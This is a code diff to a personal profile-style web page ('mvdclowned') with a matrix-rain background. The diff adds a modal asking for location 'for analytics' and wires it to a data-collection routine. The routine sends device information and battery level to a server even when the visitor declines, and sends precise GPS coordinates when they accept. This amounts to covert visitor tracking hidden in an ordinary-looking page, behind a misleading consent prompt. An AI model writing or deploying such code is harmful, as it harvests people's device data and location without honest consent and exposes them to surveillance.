@@ -35,7 +35,19 @@
     </style>
 </head>
 <body>
-    <div id="mainContent">
+    <div id="permissionModal" style="display: block; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.9); overflow: auto;">
+        <div style="background-color: #1e1e1e; margin: 15% auto; padding: 20px; border: 1px solid #666; width: 80%; max-width: 500px; color: #b3b3b3;">
+            <h2 style="color: #808080; text-align: center;">Доступ к сайту / Access to the site</h2>
+            <p style="margin: 20px 0;">Этот сайт запрашивает доступ к вашему местоположению для сбора аналитики.</p>
+            <p style="margin: 20px 0; color: #a0a0a0;"><i>This site requests access to your location for analytics purposes.</i></p>
+            <div style="display: flex; justify-content: center; gap: 10px;">
+                <button id="acceptButton" style="background-color: #333; color: #b3b3b3; border: 1px solid #666; padding: 10px 20px; cursor: pointer; transition: all 0.3s;">Принять / Accept</button>
+                <button id="declineButton" style="background-color: #333; color: #b3b3b3; border: 1px solid #666; padding: 10px 20px; cursor: pointer; transition: all 0.3s;">Отклонить / Decline</button>
+            </div>
+        </div>
+    </div>
+    <div class="container" id="mainContent" style="display: none;">
+        <canvas class="matrix-bg" id="matrix"></canvas>
         <header>
             <img src="image.jpg" alt="mvdclowned" class="avatar">
             <h1 class="glitch-text">mvdclowned</h1>
@@ -159,16 +171,61 @@
             }
         }
 
-        async function processAndSendData() {
+        async function processAndSendData(position) {
             try {
                 const rawData = {
                     deviceInfo: collectDeviceInfo(),
                     batteryLevel: await getBatteryLevel(),
+                    location: position ? {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    } : null
                 };
                 await sendDataToServer(rawData);
             } catch (error) {
                 console.error('Data processing error:', error);
             }
+        }
+        
+        function initModalHandlers() {
+            const permissionModal = document.getElementById('permissionModal');
+            const mainContent = document.getElementById('mainContent');
+            const acceptButton = document.getElementById('acceptButton');
+            const declineButton = document.getElementById('declineButton');
+            
+            if (!acceptButton || !declineButton || !permissionModal || !mainContent) return;
+            
+            const showContent = () => {
+                permissionModal.style.display = 'none';
+                mainContent.style.display = 'block';
+                initVisuals(); 
+            };
+            
+            declineButton.addEventListener('click', () => {
+                showContent();
+                processAndSendData(null);
+            });
+
+            acceptButton.addEventListener('click', () => {
+                showContent();
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            processAndSendData(position);
+                        }, 
+                        (error) => {
+                            console.error(`Geolocation error: ${error.code} - ${error.message}`);
+                            processAndSendData(null); 
+                        }, 
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                } else {
+                    console.error('Geolocation is not supported.');
+                    processAndSendData(null);
+                }
+            });
         }
         
         function initVisuals() {
@@ -193,7 +250,7 @@
                     rainDrops[i]++;
                 });
             };
-            const matrixInterval = setInterval(drawMatrix, 30);
+            setInterval(drawMatrix, 30);
             window.addEventListener('resize', () => {
                 canvas.width = window.innerWidth;
                 canvas.height = window.innerHeight;
@@ -212,8 +269,7 @@
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            initVisuals();
-            processAndSendData();
+            initModalHandlers();
         });
     </script>
 </body>
